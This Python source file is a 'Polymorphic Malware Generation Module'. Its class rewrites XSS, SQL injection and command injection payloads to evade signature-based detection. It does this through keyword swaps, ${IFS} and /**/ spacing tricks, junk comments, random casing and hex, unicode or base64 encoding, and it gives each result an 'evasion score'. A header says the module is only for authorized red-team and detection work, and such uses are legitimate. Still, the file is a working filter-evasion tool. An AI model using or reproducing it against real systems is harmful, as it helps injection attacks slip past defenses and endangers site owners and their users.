"""
Polymorphic Malware Generation Module

CRITICAL WARNING: This module generates polymorphic payloads for security testing.
Use ONLY for:
- Authorized red team engagements with explicit written permission
- AV/EDR evasion testing in controlled environments
- Security research and education
- Defensive security training
- Detection algorithm development

Unauthorized use is ILLEGAL and unethical.
"""

import logging
import random
import string
import re
from typing import Dict, Any, List, Callable
import hashlib

logger = logging.getLogger(__name__)


class PolymorphicMalware:
    """
    Generates polymorphic payloads to evade signature-based detection.

    IMPORTANT: Only use for authorized security testing.
    """

    def __init__(self):
        """Initialize polymorphic malware generator."""

        # XSS mutations
        self.xss_mutations = [
            lambda x: x.replace('alert', 'prompt'),
            lambda x: x.replace('alert', 'confirm'),
            lambda x: x.replace('XSS', 'CrossSiteScripting'),
            lambda x: x.replace('<script>', '<SCRIPT>'),
            lambda x: x.replace('</script>', '</SCRIPT>'),
            lambda x: x.replace('<script>', '<ScRiPt>'),
            lambda x: x.replace('alert', 'window.alert'),
            lambda x: x.replace('alert', 'self.alert'),
            lambda x: x.replace("'", '"'),
            lambda x: x.replace('(', '&#40;').replace(')', '&#41;')
        ]

        # SQL injection mutations
        self.sql_mutations = [
            lambda x: x.replace('OR', 'or'),
            lambda x: x.replace('SELECT', 'select'),
            lambda x: x.replace('UNION', 'union'),
            lambda x: x.replace(' ', '/**/'),
            lambda x: x.replace('=', ' LIKE '),
            lambda x: x.replace('--', '#'),
            lambda x: x.replace('1=1', '2>1'),
            lambda x: x.replace('1=1', '1 LIKE 1'),
            lambda x: x.upper(),
            lambda x: x.replace("'", "''")
        ]

        # Command injection mutations
        self.cmd_mutations = [
            lambda x: x.replace(';', '&&'),
            lambda x: x.replace(';', '||'),
            lambda x: x.replace('cat', 'tac | tac'),
            lambda x: x.replace('ls', 'dir' if 'ls' in x else x),
            lambda x: x.replace(' ', '${IFS}'),
            lambda x: x.replace('/', '${HOME:0:1}'),
            lambda x: x + ' #comment',
            lambda x: x.replace('whoami', 'id'),
        ]

    def polymorphic_payload(self, base_payload: str, payload_type: str = 'xss',
                           num_mutations: int = 2) -> Dict[str, Any]:
        """
        Generate polymorphic payload (enhanced original function).

        Args:
            base_payload: Original payload
            payload_type: Type of payload (xss, sql, cmd, generic)
            num_mutations: Number of mutations to apply

        Returns:
            Dictionary with mutated payload
        """
        logger.warning(f"Generating polymorphic payload: type={payload_type}")

        try:
            # Select mutation set based on type
            if payload_type.lower() == 'xss':
                mutations = self.xss_mutations
            elif payload_type.lower() == 'sql':
                mutations = self.sql_mutations
            elif payload_type.lower() == 'cmd':
                mutations = self.cmd_mutations
            else:
                mutations = self.xss_mutations  # Default

            # Limit mutations to available count
            num_mutations = min(num_mutations, len(mutations))

            # Apply random mutations
            mutated_payload = base_payload
            selected_mutations = random.sample(range(len(mutations)), k=num_mutations)

            mutations_applied = []
            for idx in selected_mutations:
                mutation = mutations[idx]
                old_payload = mutated_payload
                mutated_payload = mutation(mutated_payload)
                mutations_applied.append({
                    "mutation_index": idx,
                    "before": old_payload,
                    "after": mutated_payload
                })

            # Calculate signature hash
            original_hash = hashlib.md5(base_payload.encode()).hexdigest()
            mutated_hash = hashlib.md5(mutated_payload.encode()).hexdigest()

            return {
                "success": True,
                "original_payload": base_payload,
                "mutated_payload": mutated_payload,
                "payload_type": payload_type,
                "num_mutations": num_mutations,
                "mutations_applied": len(mutations_applied),
                "original_signature": original_hash,
                "mutated_signature": mutated_hash,
                "signature_changed": original_hash != mutated_hash
            }

        except Exception as e:
            logger.error(f"Polymorphic generation error: {e}")
            return {
                "success": False,
                "error": str(e)
            }

    def generate_variants(self, base_payload: str, payload_type: str = 'xss',
                         count: int = 5) -> Dict[str, Any]:
        """
        Generate multiple polymorphic variants.

        Args:
            base_payload: Original payload
            payload_type: Type of payload
            count: Number of variants to generate

        Returns:
            Dictionary with all variants
        """
        logger.info(f"Generating {count} polymorphic variants")

        try:
            variants = []
            unique_signatures = set()

            for i in range(count):
                # Vary number of mutations
                num_mutations = random.randint(1, 4)
                result = self.polymorphic_payload(base_payload, payload_type, num_mutations)

                if result.get("success"):
                    variant_sig = result["mutated_signature"]

                    # Only add if unique signature
                    if variant_sig not in unique_signatures:
                        unique_signatures.add(variant_sig)
                        variants.append({
                            "variant_id": len(variants) + 1,
                            "payload": result["mutated_payload"],
                            "signature": variant_sig,
                            "mutations": result["mutations_applied"]
                        })

            return {
                "success": True,
                "original_payload": base_payload,
                "payload_type": payload_type,
                "total_variants": len(variants),
                "unique_signatures": len(unique_signatures),
                "variants": variants
            }

        except Exception as e:
            logger.error(f"Variant generation error: {e}")
            return {
                "success": False,
                "error": str(e)
            }

    def add_junk_code(self, payload: str, junk_type: str = 'comment') -> Dict[str, Any]:
        """
        Add junk code to payload for signature evasion.

        Args:
            payload: Original payload
            junk_type: Type of junk (comment, whitespace, variable)

        Returns:
            Dictionary with modified payload
        """
        logger.info(f"Adding junk code: type={junk_type}")

        try:
            if junk_type == 'comment':
                # Add random comments
                junk = f"/* {self._random_string(10)} */ "
                modified = junk + payload + junk

            elif junk_type == 'whitespace':
                # Add random whitespace
                spaces = ' ' * random.randint(1, 10)
                tabs = '\t' * random.randint(0, 3)
                modified = spaces + payload + tabs

            elif junk_type == 'variable':
                # Add unused variables
                var_name = self._random_string(8)
                junk = f"var {var_name} = '{self._random_string(10)}'; "
                modified = junk + payload

            else:
                modified = payload

            return {
                "success": True,
                "original": payload,
                "modified": modified,
                "junk_type": junk_type,
                "length_increase": len(modified) - len(payload)
            }

        except Exception as e:
            logger.error(f"Junk code error: {e}")
            return {
                "success": False,
                "error": str(e)
            }

    def randomize_case(self, payload: str, strategy: str = 'alternate') -> Dict[str, Any]:
        """
        Randomize case of payload for signature evasion.

        Args:
            payload: Original payload
            strategy: Case strategy (alternate, random, upper, lower)

        Returns:
            Dictionary with modified payload
        """
        logger.info(f"Randomizing case: strategy={strategy}")

        try:
            if strategy == 'alternate':
                modified = ''.join(
                    c.upper() if i % 2 == 0 else c.lower()
                    for i, c in enumerate(payload)
                )
            elif strategy == 'random':
                modified = ''.join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in payload
                )
            elif strategy == 'upper':
                modified = payload.upper()
            elif strategy == 'lower':
                modified = payload.lower()
            else:
                modified = payload

            return {
                "success": True,
                "original": payload,
                "modified": modified,
                "strategy": strategy
            }

        except Exception as e:
            logger.error(f"Case randomization error: {e}")
            return {
                "success": False,
                "error": str(e)
            }

    def encode_payload(self, payload: str, encoding: str = 'hex') -> Dict[str, Any]:
        """
        Encode payload for evasion.

        Args:
            payload: Original payload
            encoding: Encoding type (hex, unicode, url, base64)

        Returns:
            Dictionary with encoded payload
        """
        logger.info(f"Encoding payload: type={encoding}")

        try:
            if encoding == 'hex':
                modified = ''.join(f'\\x{ord(c):02x}' for c in payload)

            elif encoding == 'unicode':
                modified = ''.join(f'\\u{ord(c):04x}' for c in payload)

            elif encoding == 'url':
                import urllib.parse
                modified = urllib.parse.quote(payload)

            elif encoding == 'base64':
                import base64
                modified = base64.b64encode(payload.encode()).decode()

            else:
                modified = payload

            return {
                "success": True,
                "original": payload,
                "encoded": modified,
                "encoding": encoding,
                "length_increase": len(modified) - len(payload)
            }

        except Exception as e:
            logger.error(f"Encoding error: {e}")
            return {
                "success": False,
                "error": str(e)
            }

    def advanced_polymorphism(self, base_payload: str, payload_type: str = 'xss',
                            techniques: List[str] = None) -> Dict[str, Any]:
        """
        Apply multiple advanced polymorphic techniques.

        Args:
            base_payload: Original payload
            payload_type: Type of payload
            techniques: List of techniques to apply

        Returns:
            Dictionary with highly mutated payload
        """
        logger.warning(f"Applying advanced polymorphism")

        default_techniques = ['mutate', 'junk', 'case', 'encode']
        techniques = techniques or default_techniques

        try:
            current_payload = base_payload
            applied_techniques = []

            # Apply each technique
            if 'mutate' in techniques:
                result = self.polymorphic_payload(current_payload, payload_type, 3)
                if result.get("success"):
                    current_payload = result["mutated_payload"]
                    applied_techniques.append("mutation")

            if 'junk' in techniques:
                result = self.add_junk_code(current_payload, 'comment')
                if result.get("success"):
                    current_payload = result["modified"]
                    applied_techniques.append("junk_code")

            if 'case' in techniques:
                result = self.randomize_case(current_payload, 'random')
                if result.get("success"):
                    current_payload = result["modified"]
                    applied_techniques.append("case_randomization")

            if 'encode' in techniques and payload_type == 'xss':
                result = self.encode_payload(current_payload, 'unicode')
                if result.get("success"):
                    current_payload = result["encoded"]
                    applied_techniques.append("encoding")

            # Calculate signatures
            original_sig = hashlib.md5(base_payload.encode()).hexdigest()
            final_sig = hashlib.md5(current_payload.encode()).hexdigest()

            return {
                "success": True,
                "original_payload": base_payload,
                "final_payload": current_payload,
                "payload_type": payload_type,
                "techniques_applied": applied_techniques,
                "original_signature": original_sig,
                "final_signature": final_sig,
                "signature_changed": original_sig != final_sig,
                "evasion_score": len(applied_techniques) * 25  # Simple scoring
            }

        except Exception as e:
            logger.error(f"Advanced polymorphism error: {e}")
            return {
                "success": False,
                "error": str(e)
            }

    def _random_string(self, length: int = 10) -> str:
        """Generate random string."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def get_available_techniques(self) -> Dict[str, Any]:
        """Get available polymorphic techniques."""
        return {
            "success": True,
            "payload_types": ["xss", "sql", "cmd", "generic"],
            "techniques": {
                "mutate": "Apply payload-specific mutations",
                "junk": "Add junk code (comments, whitespace, variables)",
                "case": "Randomize case (alternate, random, upper, lower)",
                "encode": "Encode payload (hex, unicode, url, base64)"
            },
            "xss_mutations_count": len(self.xss_mutations),
            "sql_mutations_count": len(self.sql_mutations),
            "cmd_mutations_count": len(self.cmd_mutations)
        }
